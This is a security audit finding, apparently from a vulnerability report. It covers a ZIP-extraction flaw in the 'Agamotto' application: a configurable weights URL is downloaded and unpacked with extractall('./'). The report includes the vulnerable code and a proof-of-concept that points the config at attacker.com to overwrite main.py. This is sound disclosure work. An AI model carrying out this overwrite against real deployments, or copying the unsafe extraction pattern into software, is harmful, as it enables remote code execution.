- Vulnerability Name: ZIP Extraction Vulnerability via Malicious `load_weights_url`

- Description:
  1. An attacker with the ability to modify the `agamotto.yaml` configuration file changes the `model.load_weights_url` parameter to point to a malicious ZIP archive hosted on an attacker-controlled server.
  2. The Agamotto application starts or reloads its configuration from the modified `agamotto.yaml`.
  3. During the application startup, the `Agamotto.download_weights()` function is executed. This function retrieves the `load_weights_url` from the configuration.
  4. The application constructs a download URL using the attacker-specified `model.load_weights_url`, `model.load_weights_version`, and `load_weights_dir`.
  5. The application then downloads the ZIP archive from the malicious URL using `keras.utils.get_file()`.
  6. After downloading, the application extracts the contents of the ZIP archive to the current working directory (`./`) using `zipfile.ZipFile.extractall("./")`.
  7. If the malicious ZIP archive is crafted to contain files that overwrite existing application files (e.g., `main.py`, `agamotto/agamotto.py`, libraries, configuration files) or introduce new malicious files (e.g., scripts, executables) into locations where they can be executed or accessed by the application, the attacker can compromise the application.

- Impact:
  - Remote Code Execution: By overwriting application code with malicious code, the attacker can achieve arbitrary code execution within the context of the Agamotto application.
  - Application Compromise: The attacker can compromise the integrity and functionality of the Agamotto application by replacing legitimate components with malicious ones, potentially leading to data breaches, unauthorized access, or denial of service.

- Vulnerability Rank: High

- Currently Implemented Mitigations:
  - None. The provided code does not implement any input validation, integrity checks, or secure extraction mechanisms for the downloaded weights.

- Missing Mitigations:
  - Input validation for `model.load_weights_url`: Implement a whitelist of allowed, trusted domains or URLs for `model.load_weights_url` in `agamotto.yaml`. Alternatively, use a more robust method to verify the source and integrity of the download location.
  - Integrity check for downloaded ZIP file: Before extracting the ZIP archive, implement a mechanism to verify its integrity. This could involve checking a checksum (like SHA256 hash) or a digital signature of the ZIP file against a known trusted value.
  - Secure ZIP extraction: Instead of extracting directly to the application's root directory, extract the ZIP archive to a temporary, isolated directory. Then, carefully copy only the expected weight files to their intended locations, avoiding overwriting any other application files. Consider using secure extraction methods that prevent directory traversal vulnerabilities within ZIP archives.
  - Principle of least privilege: Run the Agamotto application with the minimal necessary permissions. This can limit the impact of a successful ZIP extraction vulnerability by restricting what actions a compromised application can perform on the system.

- Preconditions:
  - The attacker must have the ability to modify the `agamotto.yaml` configuration file. This could be achieved if the configuration file is stored in a publicly accessible location, if there is another vulnerability that allows file modification, or if the attacker can convince an administrator to use a malicious configuration file.
  - The Agamotto application must be configured to download weights (which is the default behavior as per `agamotto.yaml`).

- Source Code Analysis:
  - File: `/code/agamotto/agamotto/agamotto.py`
  ```python
  def download_weights(self):
      """
      Downloading weights for first (or only) executions, it will download, extract and create
      a folder based on agamotto.yaml file.
      """
      url = f"{self._model_load_weights_url}/{self._model_load_weights_version}/{self._load_weights_dir}.zip"
      filename = os.path.join(os.getcwd(), f"{self._load_weights_dir}.zip")
      keras.utils.get_file(filename, url)
      with zipfile.ZipFile(f"{self._load_weights_dir}.zip", "r") as z_fp:
          z_fp.extractall("./")
  ```
  - The `download_weights` function in the `Agamotto` class constructs a URL using configuration parameters `_model_load_weights_url`, `_model_load_weights_version`, and `_load_weights_dir`, all of which are derived from the `agamotto.yaml` configuration file.
  - The function uses `keras.utils.get_file()` to download the ZIP archive from the constructed URL. Critically, it then uses `zipfile.ZipFile.extractall("./")` to extract the downloaded archive directly into the current working directory of the application without any validation or security checks.
  - There is no input validation on `_model_load_weights_url` or any of the related configuration parameters that contribute to the download URL.
  - The use of `extractall("./")` is inherently risky as it extracts all files from the archive to the current directory, which can lead to overwriting existing files if the ZIP archive is maliciously crafted.

- Security Test Case:
  1. **Prepare a malicious ZIP archive:** Create a ZIP file named `malicious_weights.zip`. Inside this ZIP file, create a directory structure that, when extracted to the application's root directory (`/code/agamotto` inside the container, assuming this is the working directory when `download_weights` is called), will overwrite the `agamotto/main.py` file. For example, the ZIP could contain the path `agamotto/main.py` with malicious content. The malicious `agamotto/main.py` can be a simple script that prints "Vulnerable!" and then exits.
  ```python
  # Malicious main.py content (example)
  print("Vulnerable!")
  exit()
  ```
  Zip this modified `main.py` and place it in the path `agamotto/main.py` inside the zip archive.
  2. **Host the malicious ZIP archive:** Set up a simple HTTP server (e.g., using Python's `http.server`) to host the `malicious_weights.zip` file. Let's assume the server is running on `http://attacker.com` and `malicious_weights.zip` is accessible at `http://attacker.com/malicious_weights.zip`.
  3. **Modify `agamotto.yaml`:** Edit the `agamotto.yaml` file located in the `/code/agamotto/` directory of the project to use the malicious URL:
  ```yaml
  model:
    load_weights_url: http://attacker.com
    load_weights_version: .
    load_weights_dir: malicious_weights
  ```
  4. **Run the Agamotto application:** Build and start the Agamotto application using Docker Compose: `docker-compose up --build`.
  5. **Observe the output:** Check the logs of the `agamotto` container. If the vulnerability is successfully exploited, the application's behavior will be altered. In this test case, if `agamotto/main.py` was successfully overwritten with the malicious version, the container logs should show "Vulnerable!" printed to the console, or the application might fail to start or behave unexpectedly because of the replaced `main.py`. If the application prints "Vulnerable!" instead of its normal startup messages, it confirms that code execution was achieved by overwriting `main.py` through the ZIP extraction vulnerability.